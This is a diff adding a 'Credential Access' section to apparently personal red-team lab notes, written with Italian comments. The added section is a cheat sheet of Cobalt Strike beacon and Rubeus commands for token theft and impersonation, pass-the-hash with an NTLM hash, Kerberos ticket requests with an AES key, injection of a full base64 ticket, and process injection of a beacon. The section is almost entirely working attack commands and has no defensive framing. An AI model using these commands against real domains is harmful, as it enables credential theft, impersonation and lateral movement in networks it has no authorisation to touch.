@@ -754,3 +754,78 @@ PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ti
 
 
 ```
+
+
+## Credential Access
+
+```bash
+#make_token con credenziali
+beacon> make_token CONTOSO\rsteel Passw0rd!
+
+#stealToken
+#aprire i processi
+ps
+#usare la funzionalità di CobaltStrike (hight integrity session)
+steal_token [numeroPID]
+
+#RevertToSelf
+rev2self
+
+#Token Store (possiamo salvare i token che abbiamo)
+beacon> token-store steal 5248
+#poi lo scegliamo
+beacon> token-store use 0
+
+
+
+#Pass The Hash
+beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
+
+#Pass The Ticket
+
+#si richiede un ticket con rubeus
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
+
+#Beacon ha un kerberos_ticket_use il ticket deve essere un .kirbi nel pc che sta eseguendo CobaltStrike
+#se abbiamo il ticket in base64 da rubeus lo si può scrivere sul disco con powershell
+$ticket = "doIFo[...snip...]kNPTQ=="
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
+
+#non bisogna fare clubbering, quindi meglio fare un logon netonly senza ticket
+
+# "FakePass" è fittizio: make_token serve solo a creare un contesto utente impersonato, non ad autenticarsi.
+beacon> make_token CONTOSO\rsteel FakePass
+#mostra che non ci sono ticket
+klist
+
+#inietto ticket .kirbi
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
+#se facciamo klist vediao il ticket
+#una volta terminato 
+beacon> kerberos_ticket_purge
+#per tornare alla sessione originale
+beacon> rev2self
+
+#Versione Rubeus
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
+#Alternativa
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
+
+
+
+#Injectio il ticket
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:doIFoDCCBZygAwIBBaEDAgEWooIEqjCCBKZhggSiMIIEnqADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGQwggRgoAMCARKhAwIBAqKCBFIEggROtBamcnEu/7ynHLwUewKlaWuh5t/323kFYx8tjVxdEYlMwiqm+EMYSDI5Fz+nuNtX6Xx2JOafezhIrh7G/YdBP1ON6Mztyfk18HeLns88lioPofyqrVFEn/Z6LP/1FGVSvYE7ppoDFjq2wbD5WWMDm330g9U3XtfYTs/AuAVxrEIhOtdqZYnUHxuG2+dphKn4bz5L086edK32xOa0EyagP3elH6uPL0pijao3sS4ndpf6/gvdtBqAg2AR1vby27WEMeksfyWF7ysuL0ae6GwvpSrJuwhYC9vcLXYWtNK4UKWJpy+SrXXA8ylxsLHcWHYo0wz1+lsOCefpRk1TvrUUvKIPJhjSNHpPB3+6/aY5b1k8if8cxdet5vWCMloYprc9KpSRiu8AtZS0VPBvlUfTVe4z4SsmdI2N1z/OsQGfnPFm5O22dN8PKhI2C0jv8vSzB245kLiPHM1V+yL0f5zdN3RT0jn7bd3GoXEMKkxZllaqu6aenCnCtV4Wi9MhMeyWyRwsux5PxTh3BgXYG201FUiKDr3q5QWXNjpnFYplGQEOMYReMtt/AYN1fSPsPStCImmpSTjx9nuFOuEu9jadnhk2bRt6vMGQUKzO4vaFSzGFIbjWzT3y6cuViSMCugSVJaaFluAyw2a4vBpyb/tM/kzOiHm9BBW4/a1QRYdqF4/BSFM1RGXjqSqhoCFEN+bn1nPv4PDReTrHvFiUtX29Ehh3PThv7BFaNHfNTrS+IbVTC7kP8xKk88Puy/BpEsaFBkpLxGbNc9fT8JUI+D4IPmubUKR+ApfMKf4efdjqxVsfhXrJeUmPYLi3KnlhsGTkOvxvQ9F5npdZ4IB8mJBa68ExmC/6NML6DRJfkRPKmebTcMvwhlQ1o7bqor+hKglo0V5V0DI902nYR4LUoDoXkaWsz5NDPnEilwDe4hL8v6c3JOKLzWVMkxE8DrGqJF8Sv8JOYT4/380w/4Jl/CxjVcu59TuPO5sA2nTRRiKBEG9anfBkUPcw+pGCLBN6Fsr4+0qQckYFqxFbtDesXjUsEsuGG+yURhbuownT0c9bDMbasiuzH6BComfGS7b85bA3arTkzrIgXfD2T/baLjc9tHH2L8WmTkRkb34ecxn8aKnc9gBQKOgs+8X4LED2ZIcyMGm5ddNz83eZGeOlmlzVu72IYTU7L3nGP5sAHNmnl7bvPADqh7WVkH1okgs+McG83TzuO6Wf4w7Wu8gl5QCmODLkDb/0crOSPq81UzAFLZfSeaH1hKxvTTepxYP7VjwBJnWsm5nmQfd5m3hOb/YvJ1wC1VS5sFRJW0R9eFIzNh/Tof+a2QU6beI/8IntmoabVujrAn/2Z41gCd/zbH0KgsalQBCzPcK7cYrpsDZ7aLdizOmM7Z02mT1WhLsuQdaXXafc3+Ns3ZPQHCatUAMPU6qz4efKWnoZowFGFmHwVeMtl01D3q/1EaGg16A2yKOB4TCB3qADAgEAooHWBIHTfYHQMIHNoIHKMIHHMIHEoCswKaADAgESoSIEIGGgxK5dlc1UgsHScNHrnVcHwW7TspwF/Ki2xYMO7K2voQ0bC0NPTlRPU08uQ09NohMwEaADAgEBoQowCBsGcnN0ZWVsowcDBQBA4QAApREYDzIwMjUwMjE3MTM0MjMzWqYRGA8yMDI1MDIxNzIzNDIzM1qnERgPMjAyNTAyMjQxMzQyMzNaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==
+
+#rubo il token del processo spawnato
+beacon> steal_token 2524
+#per tornare indietro sempre
+rev2self
+
+
+#Process Injection
+#cerco un target (serve high intergrity)
+ps
+#lo injecto
+inject 5248 x64 http
+
+```
